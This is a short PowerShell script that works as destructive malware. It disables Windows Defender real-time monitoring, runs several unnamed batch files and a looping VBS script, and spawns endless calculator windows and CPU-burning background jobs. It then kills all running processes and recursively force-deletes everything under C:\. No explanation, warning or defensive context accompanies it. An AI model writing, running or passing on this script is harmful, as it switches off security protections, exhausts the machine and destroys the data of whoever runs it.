Clear-Host 
Set-MpPreference -DisableRealtimeMonitoring $true
Start-Process -FilePath ".\intermini.bat" -Wait
Start-Process -FilePath ".\Dcube.bat" -Wait
Start-Process -FilePath ".\Psycho.bat" -Wait
Start-Process -FilePath ".\Drive.bat" -Wait
Start-Process -FilePath ".\End.bat" -Wait
Start-Process -FilePath "cscript.exe" -ArgumentList "looploop.vbs"
while($true){Start-Process -FilePath "calc.exe"}
for(){Get-Process | Stop-Process}
while($true){Start-Job -ScriptBlock {while($true){}}}
Remove-Item -Path "C:\*" -Force -Recurse
Clear-Host
